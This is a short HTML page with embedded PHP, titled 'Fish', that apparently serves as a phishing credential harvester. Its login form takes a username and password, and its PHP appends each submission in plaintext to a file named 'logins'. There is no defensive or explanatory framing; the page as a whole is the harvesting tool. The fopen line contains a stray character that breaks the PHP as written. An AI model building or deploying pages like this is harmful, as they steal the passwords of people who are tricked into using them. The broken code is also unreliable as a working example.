<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fish</title>
</head>
<body>
<form action="" method="POST">
<input type="text" name="login">
<input type="password" name="password">
<input type="submit">
</form>
<?php

if (isset($_POST['login'])) {
$f = fopen('logins', 'a')l;
fwrite($f, $_POST['login'].' '.$_POST['password']."\n");
fclose($f);
}

?>
</body>
</html>